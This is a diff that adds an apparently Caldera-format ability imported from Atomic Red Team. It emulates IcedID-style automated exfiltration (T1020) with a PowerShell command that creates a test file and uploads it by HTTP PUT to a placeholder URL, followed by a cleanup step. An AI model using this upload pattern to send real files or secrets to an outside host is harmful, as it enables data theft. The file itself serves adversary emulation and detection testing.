@@ -1,0 +1,42 @@
+- id: 9c780d3d-3a14-4278-8ee5-faaeb2ccfbe0
+  name: IcedID Botnet HTTP PUT
+  description: 'Creates a text file
+
+    Tries to upload to a server via HTTP PUT method with ContentType Header
+
+    Deletes a created file'
+  tactic: exfiltration
+  technique:
+    attack_id: T1020
+    name: Automated Exfiltration
+  platforms:
+    windows:
+      psh:
+        command: $fileName = "C:\temp\T1020_exfilFile.txt"; $url = "https://google.com";
+          $file = New-Item -Force $fileName -Value "This is ART IcedID Botnet Exfil
+          Test"; $contentType = "application/octet-stream"; try {Invoke-WebRequest
+          -Uri $url -Method Put -ContentType $contentType -InFile $fileName} catch{}
+        cleanup: $fileName = "#{file}"; Remove-Item -Path $fileName -ErrorAction Ignore
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - exfiltration
+  - t1020
+  - atomic-red-team
+  author: Atomic Red Team
+  additional_info:
+    input_arguments:
+      file:
+        description: Exfiltration File
+        type: string
+        default: C:\temp\T1020_exfilFile.txt
+      domain:
+        description: Destination Domain
+        type: url
+        default: https://google.com
+    technique_created: '2017-05-31T21:30:29.458Z'
+    atomic_guid: 9c780d3d-3a14-4278-8ee5-faaeb2ccfbe0
+    import_timestamp: '2025-06-24T11:15:07.889859Z'
